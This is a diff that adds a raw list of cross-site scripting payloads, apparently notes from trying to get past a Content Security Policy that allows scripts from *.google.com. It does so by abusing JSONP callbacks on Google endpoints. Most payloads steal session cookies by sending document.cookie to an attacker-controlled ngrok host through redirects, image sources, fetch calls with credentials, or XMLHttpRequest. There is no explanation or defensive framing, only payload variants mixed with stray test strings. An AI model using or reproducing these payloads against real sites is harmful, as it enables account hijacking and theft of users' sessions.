@@ -1,0 +1,88 @@
+
+    Cool
+    <script>alert(0);</script>
+    jjhghjghj
+    default-src 'self'; script-src 'self' *.google.com; connect-src *
+    <script>alert(0);//{"name":"Marton"}</script>
+    <script src=”http://example.com/jsonp?callback=alert(1);//”></script>
+    <script>alert(0);</script>
+    ggg
+    <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png" onerror="this.src=alert(1)"/>
+    <script type="text/javascript"> document.location='http://ae4a6c1a.ngrok.io/?c='+document.cookie; </script>
+    <a href="#" onclick="document.location='http://ae4a6c1a.ngrok.io/?c='+document.cookie;">test</a>
+    <a href="#" onclick='http://ae4a6c1a.ngrok.io/?c='>test</a>
+    <script> function myFunction() {   document.location='http://ae4a6c1a.ngrok.io/?c='+document.cookie; } </script>
+    <p id="demo" onclick="myFunction()">Click me to change my text color.</p> <script> function myFunction() {   document.location='http://ae4a6c1a.ngrok.io/?c='+document.cookie; } </script>
+    <a href="#" onclick="alert('This will be allowed')">test</a>
+    ">'><script src="https://compass-security.com/jsonp?callback=alert(1);u">
+    <script src="https://compass-security.com/jsonp?callback=alert(1);u">
+    <script src="https://google.com/jsonp?callback=alert(1);u">
+    "><script+src="https://accounts.google.com/o/oauth2/revoke?callback=alert()”></script>
+    "><script+src="https://accounts.google.com/o/oauth2/revoke?callback=alert()”></script>
+    <script>src="https://accounts.google.com/o/oauth2/revoke?callback=alert()”></script>
+    "><script+src="https://accounts.google.com/o/oauth2/revoke?callback=alert(1337)"></script>
+    <script+src="https://accounts.google.com/o/oauth2/revoke?callback=alert(1337)"></script>
+    "><script+src="https://cse.google.com/api/007627024705277327428/cse/r3vs7b0fcli/queries/js?callback=alert(1337)"></script>
+    "><script src="https://cse.google.com/api/007627024705277327428/cse/r3vs7b0fcli/queries/js?callback=alert(1337)"></script>
+    <script src="https://accounts.google.com/o/oauth2/revoke?callback=document.location='http://ae4a6c1a.ngrok.io/?c='+document.cookie;"></script>
+    <IMG SRC=javascript:alert(&quot;XSS&quot;)>
+    <IMG SRC=javascript:alert(&quot;XSS&quot;)>
+    <SCRIPT SRC=https://accounts.google.com/o/oauth2/revoke?callback=alert()></SCRIPT>
+    <SCRIPT SRC=https://accounts.google.com/o/oauth2/revoke?callback=document.location('http://ae4a6c1a.ngrok.io/?c='+document.cookie;></SCRIPT>
+    <SCRIPT SRC=https://accounts.google.com/o/oauth2/revoke?callback=document.location='http://ae4a6c1a.ngrok.io/?c='+document.cookie)></SCRIPT>
+    <SCRIPT SRC=https://accounts.google.com/o/oauth2/revoke?callback=document.location='http://ae4a6c1a.ngrok.io/?c='+document.cookie></SCRIPT>
+    <SCRIPT SRC=https://accounts.google.com/o/oauth2/revoke?callback=alert(1337)></SCRIPT>
+    <SCRIPT SRC=https://accounts.google.com/o/oauth2/revoke?callback=alert(document.cookie)></SCRIPT>
+    <SCRIPT SRC=https://accounts.google.com/o/oauth2/revoke?callback=alert(DOCUMENT.COOKIE)></SCRIPT>
+    <SCRIPT SRC=https://accounts.google.com/o/oauth2/revoke?callback=alert("Welcome Again")></SCRIPT>
+    <SCRIPT SRC=https://accounts.google.com/o/oauth2/revoke?callback=alert(\"Hi\")></SCRIPT>
+    <SCRIPT SRC=https://accounts.google.com/o/oauth2/revoke?callback=document.location=http://ae4a6c1a.ngrok.io/></SCRIPT>
+    <SCRIPT SRC=https://accounts.google.com/o/oauth2/revoke?callback=document.location=http://ae4a6c1a.ngrok.io/></SCRIPT>
+    <SCRIPT SRC=https://accounts.google.com/o/oauth2/revoke?callback=document.location="http://ae4a6c1a.ngrok.io/"></SCRIPT>
+    <SCRIPT SRC=https://accounts.google.com/o/oauth2/revoke?callback=document.location("http://ae4a6c1a.ngrok.io/")></SCRIPT>
+    <SCRIPT SRC=https://accounts.google.com/o/oauth2/revoke?callback=http://ae4a6c1a.ngrok.io/></SCRIPT>
+    <SCRIPT SRC=https://accounts.google.com/o/oauth2/revoke?callback="http://ae4a6c1a.ngrok.io/"></SCRIPT>
+    <SCRIPT SRC=https://accounts.google.com/o/oauth2/revoke?callback="ae4a6c1a.ngrok.io"></SCRIPT>
+    <SCRIPT SRC=https://accounts.google.com/o/oauth2/revoke?callback=window.location.replace("http://www.w3schools.com")></SCRIPT>
+    <SCRIPT SRC=https://accounts.google.com/o/oauth2/revoke?callback=window.location.replace("http://ae4a6c1a.ngrok.io/?c=")></SCRIPT>
+    <SCRIPT SRC=https://accounts.google.com/o/oauth2/revoke?callback=window.location.replace("http://ae4a6c1a.ngrok.io/?c="+document.cookie)></SCRIPT>
+    <SCRIPT SRC=https://accounts.google.com/o/oauth2/revoke?callback=window.location.replace("http://ae4a6c1a.ngrok.io/?c=".concat(document.cookie))></SCRIPT>
+    <SCRIPT SRC=https://accounts.google.com/o/oauth2/revoke?callback=window.location.replace("http://ae4a6c1a.ngrok.io/?c=".concat(document.cookie))></SCRIPT>
+    <SCRIPT SRC=https://accounts.google.com/o/oauth2/revoke?callback=window.location.replace("http://ae4a6c1a.ngrok.io/?c=".concat(document.cookie))></SCRIPT>
+    <SCRIPT SRC=https://accounts.google.com/o/oauth2/revoke?callback=window.location.replace("http://ae4a6c1a.ngrok.io/?c=".concat(document.cookie))></SCRIPT>
+    <SCRIPT SRC=https://accounts.google.com/o/oauth2/revoke?callback=window.location.replace("http://ae4a6c1a.ngrok.io/?c=".concat(document.cookie))></SCRIPT>
+    <SCRIPT SRC=https://accounts.google.com/o/oauth2/revoke?callback=document.write('<img src="http://ae4a6c1a.ngrok.io/?c=' + document.cookie + '" />')></SCRIPT>
+    <SCRIPT SRC=https://accounts.google.com/o/oauth2/revoke?callback=document.write('<img src=x onerror=this.src="http://ae4a6c1a.ngrok.io/?c="+document.cookie>')></SCRIPT>
+    <SCRIPT SRC=https://accounts.google.com/o/oauth2/revoke?callback=document.write('<img src=x onerror=this.src='http://ae4a6c1a.ngrok.io/?c='+document.cookie>')></SCRIPT>
+    <SCRIPT SRC=https://accounts.google.com/o/oauth2/revoke?callback=document.write('<img src="http://ae4a6c1a.ngrok.io/?c=' + document.cookie + '" />')></SCRIPT>
+    <SCRIPT SRC=https://accounts.google.com/o/oauth2/revoke?callback=document.write('<img src="http://ae4a6c1a.ngrok.io/?c=" />')></SCRIPT>
+    <SCRIPT SRC=https://accounts.google.com/o/oauth2/revoke?callback=document.write('<img+src="http://ae4a6c1a.ngrok.io/?c=" />')></SCRIPT>
+    <SCRIPT SRC=https://accounts.google.com/o/oauth2/revoke?callback=document.write('<img+src="http://ae4a6c1a.ngrok.io/?c="+/>')></SCRIPT>
+    <SCRIPT SRC=https://accounts.google.com/o/oauth2/revoke?callback=document.write('<img+src="http://ae4a6c1a.ngrok.io?c="+/>')></SCRIPT>
+    <SCRIPT SRC=https://accounts.google.com/o/oauth2/revoke?callback=document.write('<img+src="http://ae4a6c1a.ngrok.io?c="+>')></SCRIPT>
+    <SCRIPT SRC=https://accounts.google.com/o/oauth2/revoke?callback=document.write('<img+src="http://ae4a6c1a.ngrok.io?c="+\/>')></SCRIPT>
+    <SCRIPT SRC=https://accounts.google.com/o/oauth2/revoke?callback=document.write('<img+src="http://ae4a6c1a.ngrok.io?c=">')></SCRIPT>
+    <SCRIPT SRC=https://accounts.google.com/o/oauth2/revoke?callback=document.write('<img+src="http://ae4a6c1a.ngrok.io?c="/>')></SCRIPT>
+    <SCRIPT SRC=https://accounts.google.com/o/oauth2/revoke?callback=document.write('<img+src="http://ae4a6c1a.ngrok.io?c='"+"/>")></SCRIPT>
+    <SCRIPT SRC=https://accounts.google.com/o/oauth2/revoke?callback=document.write('<img+src="http://ae4a6c1a.ngrok.io?c='"+ document.cookie +"/>")></SCRIPT>
+    <script>document.location='http://ae4a6c1a.ngrok.io/?c='+document.cookie</script>
+    <script src=https://accounts.google.com/o/oauth2/revoke?callback=document.location='http://ae4a6c1a.ngrok.io/?c='+document.cookie></script>
+    * <SCRIPT SRC=https://accounts.google.com/o/oauth2/revoke?callback=<script>document.location='http://ae4a6c1a.ngrok.io/?c='+document.cookie</script>></SCRIPT>
+    <SCRIPT SRC=https://accounts.google.com/o/oauth2/revoke?callback=<script>document.location='http://ae4a6c1a.ngrok.io/?c='+document.cookie</script>></SCRIPT>
+    <SCRIPT SRC=https://accounts.google.com/o/oauth2/revoke?callback=document.location='http://ae4a6c1a.ngrok.io/?c='+document.cookie></SCRIPT>
+    <SCRIPT SRC=https://accounts.google.com/o/oauth2/revoke?callback=onfetch=function(e){e.fetch("http://ae4a6c1a.ngrok.io/?c=")};></SCRIPT>
+    <SCRIPT SRC=https://accounts.google.com/o/oauth2/revoke?callback=function(e){e.fetch("http://ae4a6c1a.ngrok.io/?c=")};></SCRIPT>
+    <SCRIPT SRC=https://accounts.google.com/o/oauth2/revoke?callback=function fetch(e){e.fetch("http://ae4a6c1a.ngrok.io/?c=")};></SCRIPT>
+    <SCRIPT SRC=https://accounts.google.com/o/oauth2/revoke?callback=fetch("http://ae4a6c1a.ngrok.io/?c=").then(res=>{console.log(res)})></SCRIPT>
+    <SCRIPT SRC=https://accounts.google.com/o/oauth2/revoke?callback=fetch("http://ae4a6c1a.ngrok.io/?c=").then(res=>{console.log(res)}) ></SCRIPT>
+    <SCRIPT SRC=https://accounts.google.com/o/oauth2/revoke?callback=fetch("http://ae4a6c1a.ngrok.io/?c=")></SCRIPT>
+    <SCRIPT SRC=https://accounts.google.com/o/oauth2/revoke?callback=fetch("http://ae4a6c1a.ngrok.io/?c="+document.cookie)></SCRIPT>
+    <SCRIPT SRC=https://accounts.google.com/o/oauth2/revoke?callback=fetch("http://ae4a6c1a.ngrok.io/?c=".concat(document.cookie))></SCRIPT>
+    <SCRIPT SRC=https://accounts.google.com/o/oauth2/revoke?callback=fetch("http://ae4a6c1a.ngrok.io",{credentials:'include'})></SCRIPT>
+    s
+    <SCRIPT SRC=https://accounts.google.com/o/oauth2/revoke?callback=fetch("http://ae4a6c1a.ngrok.io/?c=".concat(get_posts()))></SCRIPT>
+    <SCRIPT SRC=https://accounts.google.com/o/oauth2/revoke?callback=function(){var xhr = new XMLHttpRequest();xhr.open('GET', 'http://ae4a6c1a.ngrok.io', true);xhr.withCredentials = true;xhr.send(null); })></SCRIPT>
+    <SCRIPT SRC=https://accounts.google.com/o/oauth2/revoke?callback=function hi(){var xhr = new XMLHttpRequest();xhr.open('GET', 'http://ae4a6c1a.ngrok.io', true);xhr.withCredentials = true;xhr.send(null); })></SCRIPT>
+    <SCRIPT SRC=https://cse.google.com/api/007627024705277327428/cse/r3vs7b0fcli/queries/js?callback=function hi(){var xhr = new XMLHttpRequest();xhr.open('GET', 'http://ae4a6c1a.ngrok.io', true);xhr.withCredentials = true;xhr.send(null); })></SCRIPT>
+    <SCRIPT SRC=https://cse.google.com/api/007627024705277327428/cse/r3vs7b0fcli/queries/js?callback=function hi(){var xhr = new XMLHttpRequest();xhr.open('GET', 'http://ae4a6c1a.ngrok.io', true);xhr.withCredentials = true;xhr.send(null); })></SCRIPT>
+    <SCRIPT SRC=https://accounts.google.com/o/oauth2/revoke?callback=fetch("http://ae4a6c1a.ngrok.io/?c=".concat(document.cookie),{credentials:'include'})></SCRIPT>
